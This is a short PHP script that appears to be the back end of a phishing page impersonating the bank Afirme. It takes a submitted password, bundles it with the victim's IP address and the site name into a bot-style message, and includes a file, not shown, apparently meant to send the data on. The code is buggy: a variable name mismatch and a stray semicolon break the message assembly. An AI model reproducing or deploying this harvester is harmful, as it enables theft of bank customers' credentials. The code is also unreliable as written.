<?php  

	$pas=$_POST['pas'];
  


	$Enviara ="➖➖➖➖[ AFIRME ]➖➖➖➖\n".
  "<b>✔️PASS: </b>  <code>".$pas."</code>\n".

  
  

  "🌐 IP ".$_SERVER['REMOTE_ADDR']."\n";
  "🌐WEBSITE:".$_SERVER['SERVER_NAME']."\n".
  $enviar =  urldecode($enviara);
  include 'bot_id2.php';
?>
